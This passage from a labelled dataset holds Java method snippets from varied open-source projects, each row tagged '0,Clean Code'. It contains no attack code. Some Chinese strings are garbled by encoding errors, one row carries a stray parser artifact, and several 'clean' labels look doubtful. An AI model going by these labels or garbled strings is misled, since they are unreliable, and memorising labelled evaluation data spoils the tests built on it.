    mFilterArray=filters.values().toArray(mFilterArray);
  }
 else {
    filtersSecondary.put(tag,filter);
    mFilterArraySecondary=filtersSecondary.values().toArray(mFilterArraySecondary);
  }
  return filter;
}
public void registerFilter(BaseDanmakuFilter filter){
  filters.put(TAG_PRIMARY_CUSTOM_FILTER + ""_"" + filter.hashCode(),filter);
  mFilterArray=filters.values().toArray(mFilterArray);
}
",0,Clean Code
"/** 
 * Generate options for kafka connector
 * @return options
 */
@Override public Map<String,String> tableOptions(){
  Map<String,String> options=super.tableOptions();
  options.put(TOPIC,topic);
  options.put(PROPERTIES_BOOTSTRAP_SERVERS,bootstrapServers);
  if (getSinkParallelism() != null) {
    options.put(SINK_PARALLELISM,getSinkParallelism().toString());
  }
  if (format instanceof JsonFormat || format instanceof AvroFormat || format instanceof CsvFormat|| format instanceof RawFormat) {
    if (StringUtils.isEmpty(this.primaryKey)) {
      options.put(CONNECTOR,KAFKA);
      options.put(SINK_IGNORE_CHANGELOG,""true"");
      options.putAll(format.generateOptions(false));
    }
 else {
      options.put(CONNECTOR,UPSERT_KAFKA);
      options.putAll(format.generateOptions(true));
    }
    if (format instanceof RawFormat) {
      if (sinkMultipleFormat != null) {
        options.put(SINK_MULTIPLE_FORMAT,sinkMultipleFormat.identifier());
      }
      if (StringUtils.isNotBlank(topicPattern)) {
        options.put(TOPIC_PATTERN,topicPattern);
      }
      if (StringUtils.isNotBlank(sinkPartitioner)) {
        options.put(SINK_PARTITIONER,sinkPartitioner);
      }
      if (StringUtils.isNotBlank(partitionPattern)) {
        options.put(SINK_MULTIPLE_PARTITION_PATTERN,partitionPattern);
      }
    }
  }
 else   if (format instanceof CanalJsonFormat || format instanceof DebeziumJsonFormat) {
    options.put(CONNECTOR,KAFKA);
    options.putAll(format.generateOptions(false));
  }
 else {
    throw new IllegalArgumentException(""kafka load Node format is IllegalArgument"");
  }
  return options;
}
",0,Clean Code
"@Override public void intercept(HttpRequest httpRequest){
  this.log(httpRequest);
}
",0,Clean Code
"public long getSrcTinyId(){
  return this.srcTinyId;
}
",0,Clean Code
"/** 
 * <code>repeated uint32 unlocked_teleport_list = 8;</code>
 * @param value the unlockedTeleportList to add
 * @return this
 */
public GetUnlockTeleportScRsp addUnlockedTeleportList(final int value){
  bitField0_|=0x00000002;
  unlockedTeleportList.add(value);
  return this;
}",0,Clean Code
"private FinishRogueDialogueGroupCsReq(){
}
",0,Clean Code
"@Override public View onFocusSearch(View focused,int direction){
  if (mCanShowHeaders && isInHeadersTransition()) {
    return focused;
  }
  if (DEBUG)   Log.v(TAG,""onFocusSearch focused "" + focused + "" + direction ""+ direction);
  if (getTitleView() != null && focused != getTitleView() && direction == View.FOCUS_UP) {
    return getTitleView();
  }
  if (getTitleView() != null && getTitleView().hasFocus() && direction == View.FOCUS_DOWN) {
    return mCanShowHeaders && mShowingHeaders ? mHeadersSupportFragment.getVerticalGridView() : mMainFragment.getView();
  }
  boolean isRtl=ViewCompat.getLayoutDirection(focused) == ViewCompat.LAYOUT_DIRECTION_RTL;
  int towardStart=isRtl ? View.FOCUS_RIGHT : View.FOCUS_LEFT;
  int towardEnd=isRtl ? View.FOCUS_LEFT : View.FOCUS_RIGHT;
  if (mCanShowHeaders && direction == towardStart) {
    if (isVerticalScrolling() || mShowingHeaders || !isHeadersDataReady()) {
      return focused;
    }
    return mHeadersSupportFragment.getVerticalGridView();
  }
 else   if (direction == towardEnd) {
    if (isVerticalScrolling()) {
      return focused;
    }
 else     if (mMainFragment != null && mMainFragment.getView() != null) {
      return mMainFragment.getView();
    }
    return focused;
  }
 else   if (direction == View.FOCUS_DOWN && mShowingHeaders) {
    return focused;
  }
 else {
    return null;
  }
}
",0,Clean Code
"public static List<FriendWatch> getList(){
  ArrayList<FriendWatch> list=new ArrayList<>();
  String strFriendWatch=FileUtils.readFromFile(FileUtils.getFriendWatchFile());
  try {
    JSONObject joFriendWatch;
    if (StringUtil.isEmpty(strFriendWatch)) {
      joFriendWatch=new JSONObject();
    }
 else {
      joFriendWatch=new JSONObject(strFriendWatch);
    }
    for (    String id : FriendIdMap.getFriendIds()) {
      JSONObject friend=joFriendWatch.optJSONObject(id);
      if (friend == null) {
        friend=new JSONObject();
      }
      String name=FriendIdMap.getNameById(id);
      FriendWatch friendWatch=new FriendWatch(id,name);
      friendWatch.startTime=friend.optString(""startTime"",""鏃�"");
      friendWatch.weekGet=friend.optInt(""weekGet"",0);
      friendWatch.allGet=friend.optInt(""allGet"",0) + friendWatch.weekGet;
      String showText=name + ""(寮�濮嬬粺璁℃椂闂�:"" + friendWatch.startTime+ "")\n\n"";
      showText=showText + ""鍛ㄦ敹:"" + friendWatch.weekGet+ "" 鎬绘敹:""+ friendWatch.allGet;
      friendWatch.name=showText;
      list.add(friendWatch);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""FriendWatch getList: "");
    Log.printStackTrace(TAG,t);
  }
  return list;
}",0,Clean Code
"public void didSelectSearchPhotos(ArrayList<SendMessagesHelper.SendingMediaInfo> photos,boolean notify,int scheduleDate){
  if (photos.isEmpty()) {
    return;
  }
  if (!checkSlowModeAlert()) {
    return;
  }
  boolean hasNoGifs=false;
  for (int a=0; a < photos.size(); a++) {
    SendMessagesHelper.SendingMediaInfo info=photos.get(a);
    if (info.inlineResult == null && info.videoEditedInfo == null) {
      hasNoGifs=true;
      break;
    }
  }
  if (!hasNoGifs && !TextUtils.isEmpty(photos.get(0).caption)) {
    SendMessagesHelper.getInstance(currentAccount).sendMessage(photos.get(0).caption,dialog_id,replyingMessageObject,getThreadMessage(),null,false,photos.get(0).entities,null,null,notify,scheduleDate,null,false);
  }
  for (int a=0; a < photos.size(); a++) {
    SendMessagesHelper.SendingMediaInfo info=photos.get(a);
    if (info.inlineResult != null && info.videoEditedInfo == null) {
      SendMessagesHelper.prepareSendingBotContextResult(this,getAccountInstance(),info.inlineResult,info.params,dialog_id,replyingMessageObject,getThreadMessage(),notify,scheduleDate);
      photos.remove(a);
      a--;
    }
  }
  if (photos.isEmpty()) {
    return;
  }
  fillEditingMediaWithCaption(photos.get(0).caption,photos.get(0).entities);
  SendMessagesHelper.prepareSendingMedia(getAccountInstance(),photos,dialog_id,replyingMessageObject,getThreadMessage(),null,false,true,editingMessageObject,notify,scheduleDate,photos.get(0).updateStickersOrder);
  afterMessageSend();
  if (scheduleDate != 0) {
    if (scheduledMessagesCount == -1) {
      scheduledMessagesCount=0;
    }
    scheduledMessagesCount+=photos.size();
    updateScheduledInterface(true);
  }
}",0,Clean Code
"public static boolean isSimpleDataType(String type){
  if (type.equalsIgnoreCase(DATATYPE_STRING)) {
    return false;
  }
  if (type.equalsIgnoreCase(DATATYPE_SHORT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_SHORT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_INTEGER)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_INT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_LONG)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_LONG)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_DOUBLE)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_DOUBLE)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_FLOAT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_FLOAT)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_BYTE)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_BYTE)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_CHARACTER)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_CHAR)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_BOOLEAN)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_L_BOOLEAN)) {
    return true;
  }
  if (type.equalsIgnoreCase(DATATYPE_DATE)) {
    return false;
  }
  if (type.equalsIgnoreCase(DATATYPE_TIME)) {
    return false;
  }
  if (type.equalsIgnoreCase(DATATYPE_DATETIME)) {
    return false;
  }
  return false;
}
",0,Clean Code
"@Override public Long srem(final String key,final String... members){
  try {
    String member=members[0];
    String[] m=new String[members.length - 1];
    for (int idx=1; idx < members.length; ++idx) {
      m[idx - 1]=members[idx];
    }
    return redis.srem(key,member,m);
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}",0,Clean Code
"public void generate(){
  ProtoGen generator=new ProtoGen(protoPackage,javaPackage,goPackage);
  try {
    generator.processPackage(sourceJar,sourcePackage);
    generator.writeMapper(mapperDir,mapperPackage);
    generator.writeProtos(protosDir);
  }
 catch (  IOException e) {
    System.err.printf(""protogen: failed with %s\n"",e);
  }
}
",0,Clean Code
"/** 
 * <code>optional .RogueVirtualItemInfo rogue_virtual_item_info = 4;</code>
 * @return whether the rogueVirtualItemInfo field is set
 */
public boolean hasRogueVirtualItemInfo(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"/** 
 * 鍦∕apper鏂囦欢涓坊鍔犱唬鐮佽妭鐐�
 * @param mapperPath mapper.xml鎵�鍦ㄧ殑浣嶇疆
 * @param elements   闇�瑕佹坊鍔犵殑鑺傜偣鍐呭
 */
public String addElementInMapper(String mapperPath,MapperElement... elements) throws IOException, DocumentException {
  File mapperFile=new File(mapperPath);
  if (!mapperFile.exists()) {
    throw new ServiceException(""XML鏂囦欢涓嶅瓨鍦細"" + mapperPath);
  }
  Document doc=reader.read(new FileInputStream(mapperFile));
  List<Node> mapperNodes=doc.getRootElement().content();
  List<Node> newNodes=Lists.newArrayList();
  for (  Node node : mapperNodes) {
    if (node instanceof Element) {
      boolean equals=false;
      Element oldEle=(Element)node;
      for (      MapperElement newEle : elements) {
        if (!Strings.isNullOrEmpty(newEle.getId()) && newEle.getId().equals(oldEle.attributeValue(""id""))) {
          equals=true;
          newEle.setExisted(true);
        }
      }
      if (!equals) {
        newNodes.add(node);
      }
    }
 else {
      newNodes.add(node);
    }
  }
  for (  MapperElement ele : elements) {
    System.out.println(ele.getContent().trim());
    Element newEle=DocumentHelper.parseText(ele.getContent().trim()).getRootElement();
    if (ele.getLocation().equals(ElementPosition.FIRST)) {
      newNodes.add(0,newEle);
      if (!ele.isExisted()) {
        newNodes.add(0,new DOMComment(ele.getComment()));
      }
    }
 else {
      if (!ele.isExisted()) {
        newNodes.add(new DOMComment(ele.getComment()));
      }
      newNodes.add(newEle);
    }
  }
  doc.getRootElement().setContent(newNodes);
  XMLWriter writer=new XMLWriter(new FileWriter(mapperFile),format);
  writer.write(doc);
  writer.flush();
  return doc.getRootElement().attributeValue(""namespace"");
}",0,Clean Code
"private void handleIntent(Intent intent){
  String action=null;
  if (intent != null) {
    action=intent.getAction();
  }
  if (action == null) {
    checkStopSelf();
    return;
  }
switch (action) {
case ACTION_CLEAR:
    clear();
  break;
case ACTION_DELETE_RANGE:
LongList gidList=intent.getParcelableExtra(KEY_GID_LIST);
if (gidList != null && mDownloadManager != null) {
mDownloadManager.deleteRangeDownload(gidList);
}
break;
case ACTION_DELETE:
long gid=intent.getLongExtra(KEY_GID,-1);
if (gid != -1 && mDownloadManager != null) {
mDownloadManager.deleteDownload(gid);
}
break;
case ACTION_STOP_ALL:
if (mDownloadManager != null) {
mDownloadManager.stopAllDownload();
}
break;
case ACTION_STOP_RANGE:
LongList gidListS=intent.getParcelableExtra(KEY_GID_LIST);
if (gidListS != null && mDownloadManager != null) {
mDownloadManager.stopRangeDownload(gidListS);
}
break;
case ACTION_STOP_CURRENT:
if (mDownloadManager != null) {
mDownloadManager.stopCurrentDownload();
}
break;
case ACTION_STOP:
long gidS=intent.getLongExtra(KEY_GID,-1);
if (gidS != -1 && mDownloadManager != null) {
mDownloadManager.stopDownload(gidS);
}
break;
case ACTION_START_ALL:
if (mDownloadManager != null) {
mDownloadManager.startAllDownload();
}
break;
case ACTION_START_RANGE:
LongList gidListSR=intent.getParcelableExtra(KEY_GID_LIST);
if (gidListSR != null && mDownloadManager != null) {
mDownloadManager.startRangeDownload(gidListSR);
}
break;
case ACTION_START:
GalleryInfo gi=intent.getParcelableExtra(KEY_GALLERY_INFO);
String label=intent.getStringExtra(KEY_LABEL);
if (gi != null && mDownloadManager != null) {
mDownloadManager.startDownload(gi,label);
}
break;
}
checkStopSelf();
}",0,Clean Code
"public void setupBuffer(){
switch (bufferType) {
case array:
    buffer=MemoryUtils.buffer(1024 * 512);
  break;
case directBuffer:
buffer=MemoryUtils.wrap(ByteBuffer.allocateDirect(1024 * 512));
break;
}
}",0,Clean Code
"private void endYamlSequence(boolean isEmpty){
  var hasEnclosingSequence=hasEnclosingSequence();
  if (isEmpty) {
    if (hasEnclosingSequence) {
      builder.append(""[]"");
    }
 else {
      undoStartNewLine();
      builder.append("" []"");
    }
  }
  if (hasEnclosingSequence) {
    decreaseIndent();
  }
}
",0,Clean Code
"@Override public Relic create(){
  return Relic.newInstance();
}
",0,Clean Code
"@Override protected void startSet(VmSet value){
  doBeginArray();
}
",0,Clean Code
"/** 
 * <code>optional .RogueActionResultData rogue_action = 5;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RogueActionResultDataOuterClass.RogueActionResultData getMutableRogueAction(){
  bitField0_|=0x00000002;
  return rogueAction;
}",0,Clean Code
"/** 
 * Returns an expression that deserialize <code>mapData</code> as a java map. 
 */
protected Expression deserializeForMap(Expression mapData,TypeRef<?> typeRef){
  Expression javaMap=newMap(typeRef);
  @SuppressWarnings(""unchecked"") TypeRef<?> supertype=((TypeRef<? extends Map<?,?>>)typeRef).getSupertype(Map.class);
  TypeRef<?> keySetType=supertype.resolveType(TypeUtils.KEY_SET_RETURN_TYPE);
  TypeRef<?> keysType=TypeUtils.getCollectionType(keySetType);
  TypeRef<?> valuesType=supertype.resolveType(TypeUtils.VALUES_RETURN_TYPE);
  Expression keyArray=new Invoke(mapData,""keyArray"",binaryArrayTypeToken,false);
  Expression valueArray=new Invoke(mapData,""valueArray"",binaryArrayTypeToken,false);
  Expression keyJavaArray;
  Expression valueJavaArray;
  if (TypeUtils.ITERABLE_TYPE.isSupertypeOf(keysType)) {
    keyJavaArray=deserializeForCollection(keyArray,keysType);
  }
 else {
    keyJavaArray=deserializeForArray(keyArray,keysType);
  }
  if (TypeUtils.ITERABLE_TYPE.isSupertypeOf(valuesType)) {
    valueJavaArray=deserializeForCollection(valueArray,valuesType);
  }
 else {
    valueJavaArray=deserializeForArray(valueArray,valuesType);
  }
  ZipForEach put=new ZipForEach(keyJavaArray,valueJavaArray,(i,key,value) -> new If(ExpressionUtils.notNull(key),new Invoke(javaMap,""put"",key,value)));
  return new ListExpression(javaMap,put,javaMap);
}
",0,Clean Code
"@Override public List<AppraisalSurveyVO> appraisalSurvey(String status){
  List<HrmAchievementAppraisal> achievementAppraisals;
  String one=""1"";
  if (one.equals(status)) {
    achievementAppraisals=appraisalService.lambdaQuery().in(HrmAchievementAppraisal::getStatus,AppraisalStatus.FILLING_IN.getValue(),AppraisalStatus.UNDER_EVALUATION.getValue(),AppraisalStatus.CONFIRMING.getValue()).apply(""(start_time between subdate(now(),interval 1 year) and now() or end_time between subdate(now(),interval 1 year) and now() )"").list();
  }
 else {
    achievementAppraisals=appraisalService.lambdaQuery().eq(HrmAchievementAppraisal::getStatus,AppraisalStatus.ARCHIVE.getValue()).apply(""(start_time between subdate(now(),interval 1 year) and now() or end_time between subdate(now(),interval 1 year) and now() )"").list();
  }
  List<AppraisalSurveyVO> appraisalSurveyVOList=TransferUtil.transferList(achievementAppraisals,AppraisalSurveyVO.class);
  for (  AppraisalSurveyVO appraisalSurveyVO : appraisalSurveyVOList) {
    HrmAchievementTable achievementTable=achievementTableService.getById(appraisalSurveyVO.getTableId());
    appraisalSurveyVO.setTableName(achievementTable.getTableName());
    appraisalSurveyVO.setAppraisalTime(AchievementUtil.appraisalTimeFormat(appraisalSurveyVO.getStartTime(),appraisalSurveyVO.getEndTime()));
    List<AppraisalSurveyVO.ScoreLevelsBean> scoreLevels=new ArrayList<>();
    List<Map<String,Object>> mapList=employeeAppraisalMapper.queryScoreLevels(appraisalSurveyVO.getAppraisalId());
    mapList.forEach(map -> {
      scoreLevels.add(BeanUtil.toBean(map,AppraisalSurveyVO.ScoreLevelsBean.class));
    }
);
    appraisalSurveyVO.setScoreLevels(scoreLevels);
  }
  return appraisalSurveyVOList;
}",0,Clean Code
"@Override public <T,E extends Throwable>void onError(RetryContext context,RetryCallback<T,E> callback,Throwable throwable){
  onErrorRetryCount=context.getRetryCount();
}
",0,Clean Code
"@Override protected void updateItem(Number amount,boolean empty){
  super.updateItem(amount,empty);
  if (empty || amount == null) {
    setText(null);
    setGraphic(null);
    setTooltip(null);
    setContextMenu(null);
  }
 else {
    Entry entry=getTreeTableView().getTreeItem(getIndex()).getValue();
    EntryCell.applyRowStyles(this,entry);
    CoinTreeTable coinTreeTable=(CoinTreeTable)getTreeTableView();
    UnitFormat format=coinTreeTable.getUnitFormat();
    BitcoinUnit unit=coinTreeTable.getBitcoinUnit();
    String satsValue=format.formatSatsValue(amount.longValue());
    DecimalFormat decimalFormat=(amount.longValue() == 0L ? format.getBtcFormat() : format.getTableBtcFormat());
    final String btcValue=decimalFormat.format(amount.doubleValue() / Transaction.SATOSHIS_PER_BITCOIN);
    if (unit.equals(BitcoinUnit.BTC)) {
      tooltip.setValue(satsValue + "" "" + BitcoinUnit.SATOSHIS.getLabel());
      setText(btcValue);
    }
 else {
      tooltip.setValue(btcValue + "" "" + BitcoinUnit.BTC.getLabel());
      setText(satsValue);
    }
    setTooltip(tooltip);
    contextMenu.updateAmount(amount);
    setContextMenu(contextMenu);
    if (entry instanceof TransactionEntry) {
      tooltip.showConfirmations(transactionEntry.confirmationsProperty(),transactionEntry.isCoinbase());
      if (transactionEntry.isConfirming()) {
        ConfirmationProgressIndicator arc=new ConfirmationProgressIndicator(transactionEntry.getConfirmations());
        arc.confirmationsProperty().bind(transactionEntry.confirmationsProperty());
        setGraphic(arc);
        setContentDisplay(ContentDisplay.LEFT);
      }
 else {
        setGraphic(null);
      }
      if (amount.longValue() < 0) {
        getStyleClass().add(""negative-amount"");
      }
    }
 else     if (entry instanceof UtxoEntry) {
      setGraphic(null);
    }
 else     if (entry instanceof HashIndexEntry) {
      Region node=new Region();
      node.setPrefWidth(10);
      setGraphic(node);
      setContentDisplay(ContentDisplay.RIGHT);
      if (((HashIndexEntry)entry).getType() == HashIndexEntry.Type.INPUT) {
        satsValue=""-"" + satsValue;
      }
    }
 else {
      setGraphic(null);
    }
  }
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof InteractPropCsReq)) {
    return false;
  }
  InteractPropCsReq other=(InteractPropCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasInteractId() || interactId == other.interactId) && (!hasPropEntityId() || propEntityId == other.propEntityId);
}",0,Clean Code
"@Override public String getOutputText(){
  return completions.get(0).data.text;
}",0,Clean Code
"@Override public void writeExternal(ObjectOutput out) throws IOException {
  throw new RuntimeException();
}
",0,Clean Code
"@Override public int hashCode(){
  return Objects.hash(fieldName);
}
",0,Clean Code
"private int writeVarUint32Aligned6(int value){
  final int writerIdx=writerIndex;
  int numPaddingBytes=4 - writerIdx % 4;
  ensure(writerIdx + 10);
  int first=(value & 0x3F);
  final long pos=address + writerIdx;
  UNSAFE.putByte(heapMemory,pos,(byte)(first | 0x80));
  UNSAFE.putByte(heapMemory,pos + 1,(byte)(value >>> 6 | 0x80));
  UNSAFE.putByte(heapMemory,pos + 2,(byte)(value >>> 12 | 0x80));
  UNSAFE.putByte(heapMemory,pos + 3,(byte)(value >>> 18 | 0x80));
  UNSAFE.putByte(heapMemory,pos + 4,(byte)(value >>> 24 | 0x80));
  if (numPaddingBytes == 2) {
    UNSAFE.putByte(heapMemory,pos + 5,(byte)((value >>> 30) | 0x40));
    writerIndex=writerIdx + 6;
    return 6;
  }
 else {
    UNSAFE.putByte(heapMemory,pos + 5,(byte)(value >>> 30));
    UNSAFE.putInt(heapMemory,pos + 6,0);
    if (numPaddingBytes == 1) {
      UNSAFE.putByte(heapMemory,pos + 8,(byte)(0x40));
      writerIndex=writerIdx + 9;
      return 9;
    }
 else {
      UNSAFE.putByte(heapMemory,pos + numPaddingBytes + 3,(byte)(0x40));
      writerIndex=writerIdx + numPaddingBytes + 4;
      return numPaddingBytes + 4;
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 base_avatar_id = 10;</code>
 * @return the baseAvatarId
 */
public int getBaseAvatarId(){
  return baseAvatarId;
}",0,Clean Code
"@SuppressWarnings(""deprecation"") public List<J.Annotation> getAllAnnotations(Cursor cursor){
  J j=cursor.getValue();
  if (j instanceof J.VariableDeclarations) {
    return ((J.VariableDeclarations)j).getAllAnnotations();
  }
 else   if (j instanceof J.MethodDeclaration) {
    return ((J.MethodDeclaration)j).getAllAnnotations();
  }
 else   if (j instanceof J.ClassDeclaration) {
    return ((J.ClassDeclaration)j).getAllAnnotations();
  }
 else   if (j instanceof J.TypeParameter) {
    return ((J.TypeParameter)j).getAnnotations();
  }
 else   if (j instanceof J.TypeParameters) {
    return ((J.TypeParameters)j).getAnnotations();
  }
 else   if (j instanceof J.Package) {
    return ((J.Package)j).getAnnotations();
  }
 else   if (j instanceof J.AnnotatedType) {
    return getAllAnnotations((J.AnnotatedType)j);
  }
 else   if (j instanceof J.ArrayType) {
    return getAllAnnotations((J.ArrayType)j);
  }
 else   if (j instanceof J.FieldAccess) {
    return getAllAnnotations((J.FieldAccess)j);
  }
 else   if (j instanceof J.Identifier) {
    return getAllAnnotations((J.Identifier)j);
  }
  return emptyList();
}
private List<J.Annotation> getAllAnnotations(J j){
  if (j instanceof J.AnnotatedType) {
    return getAllAnnotations((J.AnnotatedType)j);
  }
 else   if (j instanceof J.ArrayType) {
    return getAllAnnotations((J.ArrayType)j);
  }
 else   if (j instanceof J.Identifier) {
    return getAllAnnotations((J.Identifier)j);
  }
 else   if (j instanceof J.FieldAccess) {
    return getAllAnnotations((J.FieldAccess)j);
  }
  return emptyList();
}
private List<J.Annotation> getAllAnnotations(J.AnnotatedType annotatedType){
  List<J.Annotation> targetAnnotations=getAllAnnotations(annotatedType.getTypeExpression());
  if (targetAnnotations.isEmpty()) {
    return annotatedType.getAnnotations();
  }
  List<J.Annotation> annotations=new ArrayList<>(annotatedType.getAnnotations().size() + targetAnnotations.size());
  annotations.addAll(annotatedType.getAnnotations());
  annotations.addAll(targetAnnotations);
  return annotations;
}
private List<J.Annotation> getAllAnnotations(J.ArrayType arrayType){
  if (arrayType.getAnnotations() != null) {
    return arrayType.getAnnotations();
  }
  return emptyList();
}
private List<J.Annotation> getAllAnnotations(J.FieldAccess fieldAccess){
  return getAllAnnotations(fieldAccess.getName());
}
private List<J.Annotation> getAllAnnotations(J.Identifier identifier){
  return identifier.getAnnotations() == null ? emptyList() : identifier.getAnnotations();
}
",0,Clean Code
"@Override public void write(MemoryBuffer buffer,T value){
  Collection collection=onCollectionWrite(buffer,value);
  int len=collection.size();
  if (len != 0) {
    writeElements(fury,buffer,collection);
  }
}",0,Clean Code
"public UploadFileRspBody(){
  ByteStringMicro byteStringMicro=ByteStringMicro.EMPTY;
  this.bytes_file_key=PBField.initBytes(byteStringMicro);
  this.bytes_check_key=PBField.initBytes(byteStringMicro);
  this.bool_file_exist=PBField.initBool(false);
  PBStringField pBStringField=PBStringField.__repeatHelper__;
  this.str_upload_ip_lan_v4=PBField.initRepeat(pBStringField);
  this.str_upload_ip_lan_v6=PBField.initRepeat(pBStringField);
  this.uint32_upload_port=PBField.initUInt32(0);
}",0,Clean Code
"@Nullable int getSelfLiveChannelBanStatus(String str,String str2);",0,Clean Code
"@Override public void actionPerformed(ActionEvent e){
  updateTable();
}
@Override public void actionPerformed(ActionEvent e){
  selectAll(true);
}
@Override public void actionPerformed(ActionEvent e){
  selectAll(false);
}
@Override public void actionPerformed(ActionEvent e){
  dispose();
}
@Override public void actionPerformed(final ActionEvent event){
  diffButtonPressed=true;
  if (diffsTable.isEditing()) {
    diffsTable.getCellEditor().stopCellEditing();
  }
  if (!validateSelectedDiffs()) {
    return;
  }
  Config.getInstance().getPreferencesBuilder().getHistoryBuilder().setDirectoryDiffPrimaryDir(primaryDirChooser.getText()).setDirectoryDiffSecondaryDir(secondaryDirChooser.getText());
  dispose();
}
@Override public void actionPerformed(final ActionEvent event){
  if (event.getSource().equals(primaryDirChooser.getButton())) {
    File file=chooseFile(DirectoryDiffDialog.this,ESide.PRIMARY);
    if (file != null && file.isDirectory()) {
      primaryDirChooser.setText(file.getPath());
    }
  }
 else   if (event.getSource().equals(secondaryDirChooser.getButton())) {
    File file=chooseFile(DirectoryDiffDialog.this,ESide.SECONDARY);
    if (file != null && file.isDirectory()) {
      secondaryDirChooser.setText(file.getPath());
    }
  }
  updateTable();
}
",0,Clean Code
"@Override public String toString(){
  return ""ChangeSalaryOptionVO{"" + ""name='"" + name + '\''+ "", code=""+ code+ "", value='""+ value+ '\''+ '}';
}
",0,Clean Code
"int getBusinessType();
",0,Clean Code
"@Override public String getUrl(){
  return ""jdbc:postgresql://localhost:5432/ali_dbhub_test"";
}",0,Clean Code
"@Override public AviatorObject call(Map<String,Object> env,AviatorObject arg1,AviatorObject arg2){
  try {
    String arg1Str=FunctionUtils.getStringValue(arg1,env);
    String arg2Str=FunctionUtils.getStringValue(arg2,env);
    DateTime date1=DateUtil.parseDate(arg1Str);
    DateTime date2=DateUtil.parseDate(arg2Str);
    long days=DateUtil.between(date1,date2,DateUnit.DAY);
    return AviatorNumber.valueOf(BigDecimal.valueOf(days).setScale(0));
  }
 catch (  Exception e) {
    throw new BusinessException(ModuleCodeEnum.EXPRESSION_PARSE_ERROR);
  }
}
@Override public AviatorObject call(Map<String,Object> env,AviatorObject arg1,AviatorObject arg2,AviatorObject arg3){
  try {
    String arg1Str=FunctionUtils.getStringValue(arg1,env);
    String arg2Str=FunctionUtils.getStringValue(arg2,env);
    Boolean isAbs=FunctionUtils.getBooleanValue(arg3,env);
    DateTime date1=DateUtil.parseDate(arg1Str);
    DateTime date2=DateUtil.parseDate(arg2Str);
    long days=DateUtil.between(date1,date2,DateUnit.DAY,isAbs);
    return AviatorNumber.valueOf(BigDecimal.valueOf(days).setScale(0));
  }
 catch (  Exception e) {
    throw new BusinessException(ModuleCodeEnum.EXPRESSION_PARSE_ERROR);
  }
}",0,Clean Code
"public void setOptions(BedrockAi21Jurassic2ChatOptions options){
  this.options=options;
}",0,Clean Code
"@TruffleBoundary public void addMethod(ClassMethod method){
  EconomicMaps.put(declaredMethods,method.getName(),method);
  if (!method.isLocal()) {
    __allMethods=null;
  }
}
",0,Clean Code
"@Override public IMouseStateChange mouseMoved(final MouseEvent event,final AbstractZyGraph<?,?> graph){
  return new CStateChange(this,true);
}
",0,Clean Code
"@Override public void registerHints(@NonNull RuntimeHints hints,@Nullable ClassLoader classLoader){
  var mcs=MemberCategory.values();
  for (  var tr : findJsonAnnotatedClassesInPackage(ZhiPuAiApi.class))   hints.reflection().registerType(tr,mcs);
  for (  var tr : findJsonAnnotatedClassesInPackage(ZhiPuAiImageApi.class))   hints.reflection().registerType(tr,mcs);
}
",0,Clean Code
"/** 
 * Creates  {@link LauncherAtom.ItemInfo} with important fields and parent container info.
 */
@NonNull public LauncherAtom.ItemInfo buildProto(){
  return buildProto(null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@55c52388",0,Clean Code
"public String getSignature(){
  return signature;
}
",0,Clean Code
"public int getCount(){
  return this.count;
}
",0,Clean Code
"private void setShifted(final int shiftMode){
  if (DEBUG_INTERNAL_ACTION) {
    Log.d(TAG,""setShifted: shiftMode="" + shiftModeToString(shiftMode) + "" ""+ this);
  }
  if (mMode != MODE_ALPHABET)   return;
  final int prevShiftMode;
  if (mAlphabetShiftState.isAutomaticShifted()) {
    prevShiftMode=AUTOMATIC_SHIFT;
  }
 else   if (mAlphabetShiftState.isManualShifted()) {
    prevShiftMode=MANUAL_SHIFT;
  }
 else {
    prevShiftMode=UNSHIFT;
  }
switch (shiftMode) {
case AUTOMATIC_SHIFT:
    mAlphabetShiftState.setAutomaticShifted();
  if (shiftMode != prevShiftMode) {
    mSwitchActions.setAlphabetAutomaticShiftedKeyboard();
  }
break;
case MANUAL_SHIFT:
mAlphabetShiftState.setShifted(true);
if (shiftMode != prevShiftMode) {
mSwitchActions.setAlphabetManualShiftedKeyboard();
}
break;
case UNSHIFT:
mAlphabetShiftState.setShifted(false);
if (shiftMode != prevShiftMode) {
mSwitchActions.setAlphabetKeyboard();
}
break;
case SHIFT_LOCK_SHIFTED:
mAlphabetShiftState.setShifted(true);
mSwitchActions.setAlphabetShiftLockShiftedKeyboard();
break;
}
}
",0,Clean Code
"private static boolean arrayEquals(Object o1,Object o2){
  if (o1 instanceof Object[] && o2 instanceof Object[]) {
    return Arrays.equals((Object[])o1,(Object[])o2);
  }
  if (o1 instanceof boolean[] && o2 instanceof boolean[]) {
    return Arrays.equals((boolean[])o1,(boolean[])o2);
  }
  if (o1 instanceof byte[] && o2 instanceof byte[]) {
    return Arrays.equals((byte[])o1,(byte[])o2);
  }
  if (o1 instanceof char[] && o2 instanceof char[]) {
    return Arrays.equals((char[])o1,(char[])o2);
  }
  if (o1 instanceof double[] && o2 instanceof double[]) {
    return Arrays.equals((double[])o1,(double[])o2);
  }
  if (o1 instanceof float[] && o2 instanceof float[]) {
    return Arrays.equals((float[])o1,(float[])o2);
  }
  if (o1 instanceof int[] && o2 instanceof int[]) {
